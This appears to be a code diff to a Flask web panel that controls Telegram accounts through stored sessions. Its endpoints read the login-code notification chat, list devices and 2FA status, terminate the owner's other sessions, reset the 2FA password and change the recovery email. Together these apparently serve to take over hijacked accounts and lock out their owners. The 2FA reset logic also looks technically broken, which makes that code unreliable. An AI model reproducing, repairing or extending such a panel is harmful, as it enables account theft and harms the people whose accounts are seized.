@@ -2,6 +2,8 @@ from flask import Flask, request, jsonify, render_template
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.tl.types import Channel, Chat
+# 🔥 IMPORT FIX FOR PYTHON 3.14
+from telethon.tl.types.account import PasswordInputSettings
 from telethon.tl.functions.account import (
     GetAuthorizationsRequest, 
     ResetAuthorizationRequest,
@@ -10,7 +12,6 @@ from telethon.tl.functions.account import (
     SendVerifyEmailCodeRequest,
     VerifyEmailRequest
 )
-from telethon.tl.types import PasswordInputSettings
 import asyncio
 import os
 import requests
@@ -21,7 +22,7 @@ MASTER_ACCESS_KEY = "noobster"
 DEFAULT_API_ID = 1234567      
 DEFAULT_API_HASH = "your_hash" 
 
-# 🔥 TELEGRAM BOT ALERTS (Apna Token aur Chat ID daal)
+# 🔥 TELEGRAM BOT ALERTS
 BOT_TOKEN = "YOUR_BOT_TOKEN"
 ADMIN_CHAT_ID = "YOUR_CHAT_ID"
 
@@ -98,7 +99,6 @@ def get_accounts():
         })
     return jsonify(acc_list)
 
-# 🔥 CHATS: SIRF NOTIFICATION BOT (777000)
 @app.route('/api/chats/<acc_id>', methods=['GET'])
 def get_chats(acc_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -113,7 +113,6 @@ def get_chats(acc_id):
     }]
     return jsonify(chats)
 
-# 🔥 MESSAGES: NOTIFICATION BOT
 @app.route('/api/messages/<acc_id>/<chat_id>', methods=['GET'])
 def get_messages(acc_id, chat_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -141,7 +140,6 @@ def get_messages(acc_id, chat_id):
     except Exception as e:
         return jsonify({"error": f"Msg Error: {str(e)}"}), 500
 
-# 🔥 PROFILE INFO (ID, Username, Devices, Admin Chats, 2FA)
 @app.route('/api/profile/<acc_id>', methods=['GET'])
 def get_profile(acc_id):
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -183,7 +181,6 @@ def get_profile(acc_id):
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# 🔥 SETTINGS: TERMINATE SESSIONS
 @app.route('/api/terminate', methods=['POST'])
 def terminate_sessions():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -213,7 +210,6 @@ def terminate_sessions():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# 🔥 SETTINGS: RESET 2FA
 @app.route('/api/change-2fa', methods=['POST'])
 def change_2fa():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
@@ -227,19 +223,30 @@ def change_2fa():
     try:
         async def set_pwd():
             pwd_info = await client(GetPasswordRequest())
+            if not pwd_info.has_password:
+                return "NO_2FA"
+            
+            # 🔥 FIX: PasswordInputSettings imported correctly
             await client(UpdatePasswordSettingsRequest(
                 password=pwd_info,
                 new_settings=PasswordInputSettings(
-                    new_algo=pwd_info.new_algo, new_password_hash=pwd_info.srp_B,
-                    hint="Reset via Panel", email=None
+                    new_algo=pwd_info.new_algo, 
+                    new_password_hash=pwd_info.srp_B,
+                    hint="Reset via Panel", 
+                    email=None
                 )
             ))
-        loop.run_until_complete(set_pwd())
+            return "SUCCESS"
+
+        result = loop.run_until_complete(set_pwd())
+        
+        if result == "NO_2FA":
+            return jsonify({"error": "2FA is not enabled on this account."}), 400
+            
         return jsonify({"success": True, "message": "2FA Password changed successfully."})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# 🔥 SETTINGS: CHANGE EMAIL (OTP)
 @app.route('/api/request-email-otp', methods=['POST'])
 def request_email_otp():
     if not check_auth(request): return jsonify({"error": "Unauthorized"}), 401
